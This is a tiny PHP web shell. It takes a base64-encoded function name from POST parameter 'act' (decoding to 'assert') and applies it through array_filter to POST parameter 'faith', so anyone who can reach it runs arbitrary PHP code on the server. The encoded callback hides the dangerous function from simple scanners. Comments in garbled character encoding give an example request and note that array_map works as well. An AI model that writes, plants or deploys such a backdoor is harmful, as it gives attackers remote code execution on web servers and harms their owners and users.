<?php $act = $_POST['act'];
$payload = array($_POST['faith'],);
array_filter($payload, base64_decode($act));
#������������Ԫ�ر�������ָ����������
#���÷�ʽ����post����act=YXNzZXJ0&faith=phpinfo();
#����array_filter��array_mapҲ��ͬ����Ч
 
?>